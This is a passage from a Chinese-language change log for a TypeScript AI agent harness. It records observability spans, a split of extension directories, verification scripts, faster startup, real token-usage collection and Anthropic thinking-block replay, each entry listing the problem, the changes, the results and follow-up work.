- 观测结果有了开箱即用的上屏出口，不必先落盘再翻文件；同时保留落盘作为可选的深度明细（含对话正文片段，属隐私，仍由开关控制）
- 换成 LangSmith / LangFuse 的成本进一步降低：新消费者只需拿 CollectedSpan，不必再自己实现一遍配对
- "嵌套段不能相加"这个陷阱从隐性变成显性：命令里有注释说明，verify-events 里有一条精确断言（手工喂 prompt 1000ms + 内嵌 llm_request 800ms，断言合计是 1.0s 而不是 1.8s）
- 真实链路已实测：一轮真实对话后 /traces 列出 prompt 1.3s + llm_request 1.3s（含真实模型名、首字延迟与用量），list_commands 里自动出现 traces

**未来可优化**：
- SpanCollector 只有环形队列，没有按 turnId 分组或树形展示；显式 parentId 仍是 ROADMAP 里未立项的一项，所以 /traces 的"正在跑"块也只能平铺
- /traces 的排版是纯文本，没走 TreeUI 的框宽夹逼，段名或细节过长时会超出终端宽度（现有 fit-width 可复用）
- watcher 与 /traces 各持一个实例，意味着同一批事件被配对两遍。开销极小（一次 Map 存取），但如果将来消费者继续增加，可考虑由总线侧提供共享的成段流
- runtime.getTraces() 返回的是 recent() 的副本，每次调用都复制整个队列（最多 200 条）；/traces 是人工敲的低频命令，暂不值得为它做增量读

---

## 2026-09-03 09:52 | 用探针法把"扩展 ctx 的能力边界"变成可执行断言，并用反向验证证明它真会报警

**牵连系统 / 层次**：验证层（scripts/verify-extensions.ts 新增 21 项）· 装配层（harness/main.ts:77 注释补漏，仍写"段落 + hook"）。注：三类口子的 ctx 形状、extension-loader 的装载逻辑、trace-log 的落盘格式与两个开关全部零改动——本次只加守卫，不改被守卫的东西

**面向的问题**：
- 上一块立下的"watcher 拿不到 on"这条边界只存在于类型声明里，而类型声明本身是可以被改的：接口加一个 on + 调用处跟着递 on，两行一起改，tsc 仍 0 错误（本次已实测确认）
- "装载器扫不扫得到扩展目录"此前无任何断言覆盖：verify-events 的 ⑧ 是直接 import trace-log 模块再手工调 registerWatchers，走的是另一条路，而搬目录这类改动最大的风险点恰在盲区里
- TypeScript 的类型在运行时被擦除，无法直接断言"某个接口的 ctx 类型里没有 on"
- 一条永远绿的断言与没有断言等价：不先证明它会在边界被拆时变红，就无法判断它究竟守住了什么

**做出的改动**：
- 探针法：往 sections/ hooks/ watchers/ 各临时写一个探针文件，探针把实际收到的 ctx 的键记到 globalThis，跑真实 loadExtensions 后断言键集合。这是绕开类型擦除的办法——不看声明，看运行时实际递出了什么
- 断言分五组：三类口子都能装载 / ctx 键恰好（watcher 只有 events、hook 有 on+events、sections 只有 addSection）/ 边界的行为证据（不开开关时通配订阅表 size 为 0、精确监听表只有 example-hook 的 before_request 一条）/ 走装载器路径的 trace-log 端到端落盘 / 坏扩展抛异常不连坐同目录排在它后面的扩展
- 坏扩展探针 __bad-ext.ts 的字母序刻意排在 __probe-ext.ts 与 trace-log.ts 之前（下划线的 ASCII 小于 t），于是它先抛错，正好验证"前面的坏了不牵连后面的"
- 探针写在 src/ 下会被 tsc 检查（include 覆盖 src/**/*.ts），所以探针形参写 unknown 保证能过类型检查，并靠 finally 删除——残留在扩展目录会被每次真实启动装载；脚本自己再断言一次"三个目录无 __ 开头的残留"
- 反向验证：故意把 WatcherModule 接口加上 on、调用处跟着递 on，结果是 tsc 0 错误而 verify-extensions 红 3 条并打印实际键 [events,on]、EXIT=1；确认断言会咬人后复原，全量 10 套 278/278 绿

**解决的问题**：
- "能力边界"从只有类型声明一道防线变成两道：类型防手滑（在调用处偷塞 on 会被对象字面量多余属性检查当场拦住），断言防改规矩（把声明与调用处一起改，编译能过但断言红）
- 上一块"未来可优化"里记的装载验证盲区已堵上，且是以常驻断言的形式而非一次性手工验证
- "不开开关时零开销"从注释里的说法变成可执行证据
- loadDir 的静默 catch 此前无从判断会不会连坐，现在有断言把"不连坐"这个行为固定住

**未来可优化**：
- 探针法需要在生产扩展目录里临时写文件，finally 能保证正常与异常两条路径都删除，但进程被强杀时仍可能留下残留；更稳的做法是让 loadExtensions 支持传入扫描根路径，把探针写到临时目录
- core/extension.ts 的三个 Ctx 接口仍无人 import，extension-loader 里是内联重复定义——契约与实现两处写，将来可能漂移（上一块已记，本次仍未做）
- loadDir 的 catch 依旧静默吞错：断言只证明了"不连坐"，没解决"扩展写错时报错无处可看"（可接到 Diagnostic）
- 反向验证是手工做过的一次性动作，没有沉淀成"断言自身有效性"的自动检查；这类元测试通常成本高于收益，此处只留记录

---

## 2026-09-03 00:12 | 扩展目录按职责拆分：watchers/ 与 hooks/ 分家，"旁观者不改流程"从注释约定升级成类型约束

**牵连系统 / 层次**：扩展契约层（core/extension.ts 新增 WatcherRegistrationCtx）· 装载层（context/extension-loader.ts 新增 WatcherModule + 第三条 loadDir 扫描）· 扩展实现（extensions/watchers/trace-log.ts 由 extensions/hooks/ 迁入，导出名 registerHooks → registerWatchers）· 示例扩展（extensions/hooks/example-hook.ts 头注释加判据指路）· 验证（scripts/verify-events.ts ⑧ 段改指新路径）。注：事件契约层（core/events.ts + runtime/events.ts）、生产端三处 trace 调用点、落盘格式与两个开关（TS_AGENT_TRACE / TS_AGENT_TRACE_FILE）零改动——搬的只是"谁装载它、从哪个目录装载"

**面向的问题**：
- `extensions/hooks/` 里住着两类性质相反的扩展：example-hook 用 `ctx.on` 改写流程（before_request 追加 system 层），trace-log 用 `ctx.events.subscribe` 通配收事件、返回值没人收（只看只录）
- 目录名是按"怎么装进来"命名的（两者都走 registerHooks 这一个口子），而不是按"是否真的钩流程"命名，于是 trace-log 被误读为"trace 与钩子机制有关"（本次对话里实际发生了这个误解）
- 装载口子只有一个、ctx 一律同时给 `{ on, events }` 两把钥匙：一个纯消费型扩展拿到了改写流程的能力，只能靠自觉不用
- 没有任何断言覆盖"装载器扫不扫得到扩展目录"：verify-events 的 ⑧ 是直接 import 模块 + 手工调注册函数，而搬目录这类改动最大的风险点恰好在盲区里

**做出的改动**：
- 扩展目录从两类拆成三类，各自一条口子、各自一份 ctx：sections/（`{ addSection }`）· hooks/（`{ on, events }`，可改写流程）· watchers/（`{ events }`，只订阅）
- trace-log 迁入 `extensions/watchers/`、导出名改 `registerWatchers`；**新口子的 ctx 里刻意不给 `on`**——"旁观者改流程"从"注释提醒 + 使用自觉"升级成"编译不过"
- core/extension.ts 补对称契约 `WatcherRegistrationCtx`（与 HookRegistrationCtx 的唯一区别就是没有 on）；example-hook.ts 头注释写清"该放 hooks/ 还是 watchers/"的判据：要不要改写流程
- 落盘逻辑一行未动：配对表、信封剥离、便签段 attrs 特例、孤儿 end 忽略、退出补记 unclosed 全部原样迁移
- 临时脚本走真实 `loadExtensions` 补上装载验证（sections 装载 1 个 / watcher 自动装载并落盘 / hook 仍改写 before_request），验完即删

**解决的问题**：
- 目录名与扩展性质对齐，"hook"一词不再同时指"装载口子"和"能改流程的订阅"两个东西
- 纯消费型扩展拿不到 `on`，误改流程在类型层面就不可能（日后新增 watcher 不必再叮嘱）
- 换 LangSmith / LangFuse 的落点更明确：它们是消费者，放 watchers/，核心与 UI 一行不改
- 装载路径首次被真实验证（此前只有"手工注册"被验证，等于只测了扩展本身、没测装载器）；全量 9 套 257/257 绿、tsc 零错误，verify-events 55/55 证明落盘行为一字未变

**未来可优化**：
- core/extension.ts 的三个 Ctx 接口目前无人 import（extension-loader 里是内联重复定义），契约与实现两处定义将来可能漂移——可让 loader 直接 implements 这三个接口
- 装载验证只在本次以临时脚本形式跑过，未沉淀成断言；可考虑加一套 verify-extensions（三类口子各一条 + ctx 能力边界）
- 扩展只按职责分类，尚无启用/禁用开关与加载顺序约定（多个 watcher 同时落盘时顺序不确定）
- loadDir 的 catch 是静默跳过（`/* 单个扩展失败跳过 */`），扩展写错时报错无处可看，可考虑接到 Diagnostic

---

## 2026-09-02 19:42 | 启动提速第二档：启动关键路径彻底断网，模型列表从"启动时拉"改成"后台预热 + 按需现拉"

**牵连系统 / 层次**：配置层（config/manager.ts 删 init() + 新增 warmModels/ensureModels/isModelsFresh/startRefresh）· 协议层抽象（llm/provider.ts 的 Provider 加 modelsFetchedAt）· Harness 启动编排（harness/check.ts 注释同步、harness/main.ts 后台预热）· 命令层（commands/builtin/model.ts 二级选择器前按需现拉）· 验证（scripts/verify-startup.ts 新增）。注：check() 的返回契约（CheckResult）与诊断分档语义零改动——省掉的只是它内部的等待；/model 的交互流程也零改动（只在二级展开前多一步 ensureModels）

**面向的问题**：
- 第一档只把 probeStartup 挪到了后台，界面渲染前还剩最后一批真实往返：`getConfigManager()` 会 `await init()`，为每个有 key 的供应商并行拉 `/models`，而 `check()` 又 await 它
- 实测这批请求冷连接 1998ms、连接池热时 278ms；网络差时每家最长卡 10s 超时（AbortSignal.timeout(10000)），全程终端只有 banner 没有 UI（用户已就此投诉过）
- 每次启动都在为用户可能永远不会打开的菜单提前付钱：`getModels()` 的 9 个调用点里只有 `/model` 的二级选择器真需要远程列表
- 旧代码里"拉取失败"与"拉到空列表"无从区分，也没有任何"这份列表还算不算新鲜"的概念，只能要么每次现拉、要么永远不拉

**做出的改动**：
- manager.ts：删掉 `init()`，`getConfigManager()` 变成 `Promise.resolve(new ConfigManager())`（保留 Promise 签名：调用方已全面 await，日后加异步初始化不必改调用点）
- manager.ts：`warmModels()` 并行预热有 key 的几家，失败不抛（fetchRemoteModels 内部已 swallow）；`ensureModels(id)` 新鲜期内直接返回、否则现拉；`isModelsFresh(id)` 供调用方决定要不要先提示"正在拉取"
- manager.ts：`inflight` Map 去重——预热与用户开 /model 撞在同一家时，第二个调用方复用在飞的 promise；`refreshModels(id)` 走同一个入口但无视新鲜期（输入新 key 后必须现拉）
- provider.ts：Provider 加 `modelsFetchedAt`（null = 本进程还没成功拉过）；`refreshModels` 只在 `remote.length > 0` 时盖戳，否则断网那一次会被误记成"已新鲜"、之后整个进程周期再也不重试
- main.ts：预热放在 RPC 早退分支之后（外部程序用不到选择器），且只在 `process.stdin.isTTY` 下发起（非 TTY 时选择器直接返回第一项、列表根本不会被展示；管道模式跑完就退，在飞的 fetch 反会把进程拖到超时）
- model.ts：二级选择器展开前先 `isModelsFresh` 判一下，不新鲜就打印"正在拉取模型列表…"再 `ensureModels`——现拉要 0.3~0.9s，没提示看着像卡死
- scripts/verify-startup.ts：临时配置造三家供应商（有 key / 没 key / 坏地址）+ 假服务器按路径计数 + fetch 探针，32 项

**解决的问题**：
- 启动关键路径 0 网络请求：check() 全链路 760ms → 0.7ms（new ConfigManager() 0.6ms，只读 3 个本地文件）
- 被移出去的两项都在后台：warmModels 1041ms（3 家并行）+ probeStartup 285ms，界面渲染不等它们
- 用户开 /model 的体感反而更好：新鲜期内 0.0ms（旧实现每次开都要重拉一遍），过期现拉一家 552ms 且有明确提示
- 断网启动不再退化：列表有静态兜底、自检本来就在后台，"拉取失败"与"列表已新鲜"两个状态被 modelsFetchedAt 分开了
- 重复请求有了收口：并发打同一家只发一次

**未来可优化**：
- 活动供应商启动时被拉两次（warmModels + probeStartup）。合并需要 fetchRemoteModels 交出 HTTP 状态码（probe 靠它分档 401），为省一次后台请求改契约不划算，先记着
- 新鲜期是写死的 5 分钟常量，没做成配置项；模型列表的变化频率是"月"级，真要调也是调大而不是调小
- 一级列表的"N 个模型可用"在预热完成前显示静态数（13 而非 33），要修得让 UI 订阅一个"列表已更新"事件——为一行说明文字加一条事件不划算
- 第三档（预编译发行）仍在 ROADMAP：node 冷启动 + tsx 即时转译是剩下的固定底噪（本次实测两个模块的 import 链路 19ms）
- 落盘缓存这条路被明确否掉了（见 DECISION_LOG 同日条目），若将来出现"跨进程复用列表"的真实需求再重开

---

## 2026-09-02 19:09 | L3 打通流式真实 usage：Provider 层填上观测链最后一个空槽，token 数从本地估算变 API 真值

**牵连系统 / 层次**：Provider 层（llm/stream-helper.ts 的 OpenAI 兼容路径 + llm/anthropic.ts）· Agent Loop 契约与实现（core/loop.ts 的 AgentLoopResult 扩字段 + loop/agent-loop.ts 逐轮合计）· Runtime 编排层（runtime/runtime.ts 真值优先、缺失回退）· 事件契约注释（runtime/events.ts）· 验证（scripts/verify-usage.ts 新增）。注：流事件契约（llm/types.ts 的 end 事件）与**全部消费端**（TreeUI / trace-log hook / RPC）零改动——usage 走的是上一块就留好的槽位，填上即自动生效

**面向的问题**：
- 上一块（16:26）留下的唯一空槽：`llm_request_end.usage` 恒为 null。两条协议都得主动去拿——OpenAI 兼容端**默认不在流式响应里给用量**，必须显式索取；Anthropic 把用量拆在 `message_start`（输入）与 `message_delta`（输出累计值）两个事件里
- token 数只能靠 `estimateTokenUsage` 估算，而它只算 user 输入 + 最终回复：多轮工具循环的中间 assistant/tool 消息、system prompt、5 个工具描述全没算。实测同一条冒烟：估算 {26,23,49} vs API 真值 {2834,71,2905}，输入侧少报约 109 倍
- Anthropic 的缓存语义会诱发伪报：本项目在 system 分层与 tools 上都设了 `cache_control` 断点，命中时 `input_tokens` 只剩个位数（它只统计"本次新读的非缓存部分"），照字面填就等于报"这次几乎没发输入"
- 索取用量本身有兼容风险：严格校验未知字段的代理端会直接 400，为一个统计参数把用户的对话搞挂不值得
- 多轮合计的完整性无从表达：任一轮拿不到用量时，"把拿到的几轮相加"会报出一个看起来是真值的少报数字

**做出的改动**：
- `stream-helper.ts`：请求体加 `stream_options.include_usage`；解析 `[DONE]` 之前那个 `choices=[]` 的专用 chunk；`total_tokens` 缺省时自加；`toLLMUsage()` 收口字段映射
- `stream-helper.ts` 降级机制：400 且错误文本含 `stream_options` → 进程级开关 `streamUsageSupported` 永久关闭 + 同一次调用内静默重试一次；其他 400 原样抛出（不误吞密钥无效/余额不足）
- `anthropic.ts`：`AnthropicStreamUsage` 接口含两个缓存字段；`message_start` 填输入（三项相加）、`message_delta` 填输出（累计值 → 覆盖不累加）；`sawUsage` 标志区分"没见到用量事件"与"见到了 0"
- 两条路径统一不伪报：没拿到用量就不在 end 事件上带 `usage` 键（而非填 0），上层因此能把 null 与 0 分开
- `core/loop.ts`：`AgentLoopResult` 从 `{finalText}` 扩成 `{finalText, usage: LLMUsage | null}`（契约层，实现与调用方共用）；顺带删掉 `agent-loop.ts` 里的重复定义
- `agent-loop.ts`：`usageTotal` 累加器与 `usageComplete` 可信标志分开两件事；任一轮 null 或流异常 → 整体 null；用量经 `trace()` 回调的**返回值**上送进 `llm_request_end` 载荷（TS 的控制流不追踪闭包内赋值，写成回调内改外层 let 会被锁死成初始的 null）
- `runtime.ts`：`usage ?? estimateTokenUsage(...)` —— 真值优先、缺失才回退，累计与 `usage` 事件随之变准
- `runtime/events.ts`：`LLMRequestEndEvent.usage` 的注释从"两个 Provider 都还没填这个槽"改成两条协议各自的实际取法
- `scripts/verify-usage.ts`：一台假服务器按 URL 分流演两种协议、两个队列各自回放预制 SSE，22 项覆盖两条协议路径 + 合计 + 降级 + 上送

**解决的问题**：
- 观测链最后一个空槽填上：`llm_request_end.usage` 与 `prompt_end.totalUsage` 从估算变 API 真值，而消费端一行未改（真值走的是早已存在的字段）
- `/usage` 的口径终于对得上账单：多轮任务下的 system prompt、工具描述、中间消息全都算进去了
- Anthropic 缓存命中不再少报：三项相加后，命中缓存的请求报出的是真实计费量
- 不兼容端点不会因统计参数挂掉对话：降级后行为与改造前完全一致，用户看不到失败
- "少报的真值"这个新型误导被堵住：任一轮缺失即整体 null，消费端不必猜合计是否完整

**未来可优化**：
- 非流式 `chat()` 路径仍无用量：`ChatResult` 没有 usage 字段，compaction 的摘要调用（走 `chat`）消耗的 token 从未计入 `totalUsage`——需新增一条"旁支用量回流"通道，属独立议题
- 缓存明细未单列：`LLMUsage` 只有三个槽，命中率（cache_read / 总输入）这个最能省钱的信息被合并掉了，要报得先扩契约
- 降级开关是进程级：同进程内从严格代理切到兼容端点也不会再索取，重启才恢复；可改成按 baseUrl 记忆
- 估算回退的精度未改：`estimateTokenUsage` 仍只算 user 输入 + 最终回复，缺失时的数字依旧偏小（可考虑把 toolMessages 全量算进去）
- 本次踩的 TS 闭包 CFA 坑只写在了 `agent-loop.ts` 的行内注释里，未沉淀成可检索的规则（它为本次贡献了两轮无效的 never 排查）

---

## 2026-09-02 16:26 | 可观测层落地：总线盖戳 + 打卡机（span）+ 双通道契约（骨架/便签），三重循环首次有边界

**牵连系统 / 层次**：事件契约层（core/events.ts + runtime/events.ts）· Agent Loop（loop/agent-loop.ts）· Runtime 编排层（runtime/runtime.ts）· CompactionService（context/compaction.ts）· UI 消费层（io/ui/tree-ui.ts）· 扩展层（extensions/hooks/trace-log.ts 新增）· 验证（scripts/verify-events.ts 新增）。注：会话存储（session/jsonl-storage.ts）与 Provider 层（llm/）零改动——usage 槽位早已在 `LLMStreamEvent` 的 end 事件上留好，填上即自动生效

**面向的问题**：
- 11 种事件全是**离散点**：无时间戳、无序号、无分组 ID、无成对边界。一次带 3 个工具的 prompt 实际发生 4 次 LLM 往返，对外一个边界事件都没有——"单次 LLM 多久""首字多慢""压缩占了多少时间"永久无法回答
- 唯一的 EventStream→EventBus 翻译点（agent-loop 的 `for await`）把 provider 的 `end{fullText, usage}` 整个丢掉：完整回复、真实用量、"LLM 调用结束"的边界全部丢失
- 信息只能在源头采集，不能在下游重建：TTFT 只在收到第一个 token 的那一刻可量，出了作用域永久丢失；而成败、耗时这些只有生产端知道的事实，过去迫使消费端去猜（TreeUI 拿 `result.includes('失败')` 判红绿）
- 配对靠自觉必漏：工具抛异常时 catch 分支只记诊断不发 `tool_execution_end`，任何按 start/end 计数的消费者会永远认为它还在执行
- 观测后端选型被语义欠账锁死：没有边界就没有树，接 LangSmith 也只能上报一堆无父子的孤点

**做出的改动**：
- 公共头下沉到总线：`EventMeta{at, seq, turnId}` 由 `emit()` 统一盖上（唯一必经之路，生产端零改动全量生效）；`beginTurn()` 在 `Runtime.prompt` 入口换发分组，`isStreaming` 时不换发（排队输入不能掀翻在飞回合）
- 生产/消费类型分离：`RuntimeEventIn`（草稿）与 `RuntimeEvent = RuntimeEventIn & EventMeta`（完整事件）；`EventBus<TIn, TOut>` 改双类型参数，默认 TOut=TIn 保证旧写法行为不变
- 打卡机（`SpanRecorder`）：`trace()` 自动配对（try/finally 结构保证，抛异常/提前 return/continue 都漏不掉，不吞异常只重抛）、`beginSpan()` 手动版供跨 finally 场景；`Span` 句柄带 spanId/set/end/fail/closed（防重复打卡）
- 退化路径：`NOOP_SPAN_RECORDER` + `spanRecorderOf()`——测试替身（noopEvents）与未接观测的旧总线拿到的永远是可调用的打卡器，业务代码不为"有没有观测"写两套分支
- 双通道契约：路 A 骨架四段（prompt/llm_request/tool_call/compaction）强类型，`SpanContracts` 做段名→载荷映射，`SpanAttrs<K>` / `SpanResult<K>` 用 Omit 剔掉总线负责的字段；路 B 便签（`note_start`/`note_end`）段名降级成 `name`、载荷自由字典，扩展加观测点核心零改动
- 三重循环挂段：外层 while → `beginSpan('prompt')`（finally 里关门，catch 里 `root.fail`）；中层 for turn → `trace('llm_request')`（首个 token 到达时算 TTFT，空流标 `status='empty'`）；内层 for tc → `trace('tool_call')`（权限弹窗刻意放在段外：等人点按钮的时间不算工具耗时）；旁支 → `trace('compaction')`
- L0 配对漏洞：`tool_execution_end` 改为成功/软失败/异常/用户拒绝四条路径统一发射，新增 `ok: boolean` 由生产端直说成败
- 消费层：TreeUI 删掉三行子串猜测改吃 `ok`；新增 `prompt_start`（清上回合统计）/`llm_request_end`（累计次数与耗时、取首次 TTFT）/`prompt_end`（结算实测账）三个 case
- 旁路消费者：`trace-log.ts` hook（`TS_AGENT_TRACE=1`）把成对 span 落成"一行一段完整行为"的 JSONL，进程退出时未关门的段补记 `status='unclosed'`

**解决的问题**：
- 四个原本答不上来的问题现在能答：单次 LLM 往返多久、首字多慢、压缩占了多少时间、工具到底成没成（实测一次 RPC 管道：llm_request 1688ms / 首字 1365ms / prompt 全程 1692ms）
- 配对从"靠自觉"变成"靠结构"：异常、提前退出、continue 都关得了门，同类 bug（工具期黑屏、UI 卡在下边框）从根上消除
- 观测后端变成可插拔：落盘、`/traces` 命令、TreeUI、LangSmith/LangFuse 全是 `subscribe()` 的并列订阅者，互不干扰
- 顺手带出两个真 bug：TreeUI 子串猜测误判红绿、`setLLM` 热切换后 AgentLoop 仍持旧 Provider（兜底切换形同虚设）
- 零依赖不破：全部自研，`package.json` 的 `dependencies` 仍为空

**未来可优化**：
- L3：两个 Provider 的流式路径都还没填 `end{usage}` 槽（stream-helper 缺 `stream_options.include_usage`、anthropic 未解析 `message_start`/`message_delta`），当前 `usage` 恒为 `null`，填上后消费端不必改
- 无 parentId：四段靠 turnId + 时间区间包含关系可重建层次，但未显式给出树形（若接 LangSmith 需消费者自行推导）
- 缺一个 `/traces` 内置命令（目前只能看 JSONL 文件）
- 51 处裸 console 仍未收编：它们不进总线，因此既无时间戳也不参与配对
- 启动期与运行期仍是两个独立发射器（main.ts 的 events 与 Harness.events），check_start/check_done 的 turnId 为空串

---

## 2026-08-31 18:11 | 阶段C3（问题3）多轮回放三管道落地（收集→挂载→回放）+ 安全阀精确化，工具循环每轮皆可思考

**牵连系统 / 层次**：LLM 协议层（llm/types.ts + anthropic.ts）· Agent Loop（loop/agent-loop.ts）· 验证脚本（scripts/verify-c3.ts）。注：会话存储（session/jsonl-storage.ts）零改动——已查证只存纯文本，回放义务天然限于单次 run() 内存消息链；问题4（原则边界修订）已随本次一并定调：推理文本展示不持久不变，thinking 块属协议数据例外保留（内存内）

> ⚠ **2026-09-04 行内更正（原文不改）**：上句“已查证只存纯文本”是**错的**。`MessageEntry` 自 version 2 起就带 `tool_calls` / `tool_call_id` / `name`，`appendMessage` 的 `extra` 能写、`getMessages()` 会还原。**本块的结论不受影响**（回放义务确实限于单次 run()），但成因不是存储层：`thinkingBlocks` 不落盘，且 `runtime.ts` 组装请求时只映射 `role` + `content`。详见本文件顶部 2026-09-04 那块与 [ARCHITECTURE.md](./ARCHITECTURE.md#四已知架构债) 第四节第 9 条。

**面向的问题**：
- 问题1+2 留下的临时安全阀是粗粒度关闭（有 assistant 历史就不开）：工具循环从第 2 轮起永久裸答，六杠杆①在 Anthropic 路径实际只覆盖首轮——根因不是规则太严，而是没有"还债能力"（上一轮带签名的 thinking 块无处可寄）
- Anthropic 协议硬约束：开 thinking 的请求里，带 tool_use 的历史 assistant 轮必须原样回放其 thinking 块（一字不改，验 signature），否则 400——需要一条贯穿流解析、循环状态、请求构造三处的数据管道，而三处分属两个文件，缺任何一环都是断头路
- 回放作用域必须先定界：会话存储只存纯文本（tool_calls 都不存），若误把回放义务扩到跨用户轮，会去设计根本不需要的持久化格式——先查证事实再定边界，把问题空间收敛到单次 run()
  - ⚠ **2026-09-04 行内更正（原文不改）**：括号里“tool_calls 都不存”**是错的**——格式支持往返，只是入口无人写（`appendMessage` 不传 `extra`）、出口被 `runtime.ts` 丢弃。“把问题空间收敛到单次 run()”这个结论仍成立，因为 `thinkingBlocks` 确实不落盘。见 [ARCHITECTURE.md](./ARCHITECTURE.md#四已知架构债) 第四节第 9 条。

**做出的改动**：
- 数据模型（types.ts）：ThinkingBlock 接口（推理文本+signature）；LLMMessage 加可选 thinkingBlocks（注释点明作用域：仅内存消息链，存储不碰）；LLMStreamEvent 加 thinking_block 变体（成品事件，与 reasoning 原料分片分工明确）
- 收集管（anthropic.ts 流解析）：thinking_delta 双通道（推 reasoning 展示事件 + 按 index 累积入块）、signature_delta 只累积（不展示），content_block_stop 时拼装完整块推 thinking_block 事件；流中断未收到 stop 的残块丢弃（签名不完整不可回放，宁弃不假）
- 挂载管（agent-loop.ts）：每轮声明 turnThinking 收集器，事件循环加 thinking_block 分支；工具轮 push assistant 消息时条件展开挂块（无块不传键，兼容 exactOptionalPropertyTypes）；最终答案轮直接 break 不落消息（无后续轮，无回放义务）
- 回放管（anthropic.ts toAnthropicMessages）：assistant 分支把块置于 content 数组最前（还原产出顺序：先思考后工具），一字不改原样寄回；非流式 chat 不回放（单次调用无后续轮，阅后即焚合理）
- 安全阀精确化（resolveAnthropicThinking）：关闭条件收窄为"存在带 tool_calls 但无 thinkingBlocks 的 assistant"——纯文本历史（跨用户轮）与带块历史（回放有保障）都不拦截；未来压缩若截断带块消息，此阀自动降级兜底（鲁棒性副产品）
- verify-c3.ts 重构为脚本队列（流式请求按序回放三套预制流，避免计数被 chat 请求污染），新增真实 AgentLoop 驱动的两轮端到端断言共 9 项（块/签名/位置原样、精确阀两侧、挂载语义）
- 编译验证：tsc 零错误（含修一处 TS6196：未使用导入改为拼装处显式标注 ThinkingBlock）；全量回归 A/B 13 + C1 8 + C2 16 + C3 17 = 54 项全绿

**解决的问题**：
- 工具循环每轮皆可思考：安全阀从"防 400 的粗闸"变成"按实际欠债状态精确判定"，六杠杆①在 Anthropic 路径覆盖全部工具轮（问题3 核心交付；问题1+2 块里承诺的"问题3 落地后移除临时阀"兑现——不是删除而是精确化）
- 三管道分工清晰且各自可独立验证：收集管归协议层（只懂 SSE）、挂载管归循环层（只懂轮次）、回放管归请求构造（只懂形状）——未来接其他需要回放协议的供应商时管道形状可直接复用（问题5 通道复用方向的地基）
- "展示不持久"原则边界修订落地（问题4）：推理文本仍只展示；thinking 块被明确定性为协议数据在内存链内保留——原则从一刀切变为按数据性质分层，注释中写死边界防止后人误清理（防篡改章丢一个字符就是 400）
- 验证边界：本地假服务器两轮回放端到端全绿，但真实 Anthropic API 未实测（无 key/余额）——真实签名校验严格度、多块场景（一轮多个 thinking 块）待有条件时实测（诚实标注）

**未来可优化**：
- budget_tokens 仍是固定常量 2048，可按任务复杂度分级（问题1+2 遗留项）；真实 Anthropic 实测；若未来引入消息压缩，需保证带块 assistant 消息不被截断（当前安全阀会自动降级兜底，但会损失思考能力，届时应改为"压缩时连带删工具轮"保持配对完整）

---

## 2026-08-30 11:23 | 阶段C3（问题1+2）Anthropic thinking 参数消费 + 推理分流（判定链路覆盖第二条供应商路径）

**牵连系统 / 层次**：LLM 协议层（llm/anthropic.ts + stream-helper.ts）· 验证脚本（scripts/）。注：本块仅含 C3 的问题1（判定失效）与问题2（请求形状适配），问题3（多轮回放/数据模型）与问题4（原则边界修订）未启动（用户拆分推进）

**面向的问题**：
- 判定链路在 Anthropic 路径上是断头路：C2 把判定结果（opts.thinking）送到 anthropic.ts 门口，但 chat/stream 两处 void opts 直接丢弃——用户切到 anthropic 后 thinking 配置静默失效（比报错更糟：无任何提示），六杠杆①只覆盖一半供应商（直接原因其实是两处代码未接线，字段形状不一致只是表象，本次一并修）
- 两家协议形状不同：OpenAI 兼容用 thinking:{type:'enabled'|'disabled'}，Anthropic 用 thinking:{type:'enabled',budget_tokens}——且 budget_tokens 必须严格小于 max_tokens（违反即 400），原代码两处写死 max_tokens:4096，存在隐性耦合（数字陷阱）
- 推理文本到达形状也不同：Anthropic 走 thinking 内容块的 thinking_delta 分片（而非 OpenAI 的 delta.reasoning_content），不识别则静默丢弃；若混入正文则污染 fullText——而 C1 已建好 reasoning 展示通道，此处只需接线不需新架构（复用 > 新建）
- 多轮回放未落地前的回归风险：thinking 开启后响应带 thinking 块（带 signature），下一轮不回放会 400，而回放是问题3（数据模型改造）——本次若只开不防，会把新回归引入工具循环（分段推进的代价必须被显式管控）

**做出的改动**：
- stream-helper 导出 resolveThinkingEnabled（原私有），成为两条供应商路径共用的判定单一真相源（按次覆盖 > 配置，优先级逻辑不再写第二份）；顺手修两处 body 构造的缩进回归（此前编辑工具副作用）
- anthropic.ts 新增 resolveAnthropicThinking（config + opts + messages 三参）：判定通过后额外过一道临时安全阀——历史含 assistant 消息时强制不开（回放能力未落地，防 400；问题3 落地后移除）；两处写死的 4096 提为 ANTHROPIC_MAX_TOKENS 常量，与 THINKING_BUDGET_TOKENS（2048）显式联动满足 budget < max_tokens 硬约束
- AnthropicRequest 类型加 thinking 字段（与 OpenAI 形状差异用注释点明）；chat/stream 两处 body 按判定结果条件携带（关闭时不发该键，而非发 disabled——Anthropic 无此状态）
- 流解析新增两个分支：content_block_start type:'thinking' 置块内标记（content_block_stop 复位）；thinking_delta 分片推 reasoning 展示事件（不进 full 累积，展示不持久同 C1）——两套 UI 的“🧠 推理中”/“💭 思考了 N 字”零改动直接生效（C1 事件链设计的复用红利）
- scripts/verify-c3.ts：假 Anthropic 服务器（chat 返 JSON / stream 回放预制 thinking+text 双块 SSE）8 项：参数消费、budget 约束、安全阀、覆盖优先、配置兜底、推理分流；沿用延迟退出规避 libuv 断言
- 编译验证：tsc --noEmit 零错误；全量回归 A/B 13/13、C1 8/8、C2 16/16 全绿（安全阀未破坏既有链路）
- 日志事故自纠：CHANGE_LOG 插入新条目时误将 C2 首条覆盖丢失，发现后立即补回（插入类编辑必须把保留行写进 new_text 的教训再次验证）

**解决的问题**：
- 两条供应商路径的 thinking 判定从此共用同一优先级逻辑：切到 anthropic 后配置/按次判定同样生效，静默失效消除（问题1）；协议形状差异被适配器层吸收，上层（Runtime/Loop）对两家无感知（问题2）
- 安全阀把“分段推进”的回归风险显式圈住：回放未落地前，Anthropic 路径只在无历史轮开推理（行为等同“首轮思考”），不产生 400，也不冒充完整能力（能力边界诚实）
- 验证边界：本地假服务器全绿，但真实 Anthropic API 未实测（无 key/余额）；真实服务的 signature 校验严格度、thinking_delta 实际分片行为待有条件时实测——未验证项如实标注（验证边界诚实）
- 复选框约定同前：本次无新增提示词/配置约定（纯协议层适配，对提示词与用户透明）

**未来可优化**：
- C3 问题3：多轮回放（LLMMessage 加 thinkingBlocks 字段 + signature 收集，移除安全阀）；问题4：“展示不持久”原则需为协议数据修订边界；budget 目前是固定常量，可升级为按任务复杂度分级；真实 Anthropic 实测待具备条件——下一轮从问题3 开始（用户拆分推进节奏）

---

## 2026-08-30 11:09 | 阶段C2 thinking auto 判定（Runtime 按次下发）+ TASK.md 工程侧清理（生命周期闭环）

